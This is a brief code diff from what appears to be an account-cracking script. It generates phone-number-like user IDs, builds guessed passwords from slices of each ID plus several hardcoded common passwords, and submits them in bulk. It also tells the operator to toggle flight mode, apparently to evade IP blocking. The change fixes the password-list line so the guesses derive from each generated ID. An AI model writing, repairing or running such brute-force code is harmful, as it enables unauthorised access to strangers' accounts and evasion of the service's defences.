@@ -391,7 +391,7 @@ def india():
 			print(f'\033[1;32m[\033[1;31m✓\033[1;32m] PLEASE [ON/OF] YOUR FLIGHT MODE');linex()
 			for psx in user:
 				uid = code+psx
-				passlist = [ids[:6],ids[:8],ids,ids[2:],ids[4:],'57273200','59039200','57575751']
+				passlist = [uid[:6],uid[:8],uid,uid[2:],uid[4:],'57273200','59039200','57575751']
 				if mthd in ['1','01']:
 					habib.submit(rndm1,uid,passlist)
 				if mthd in ['2','02']:
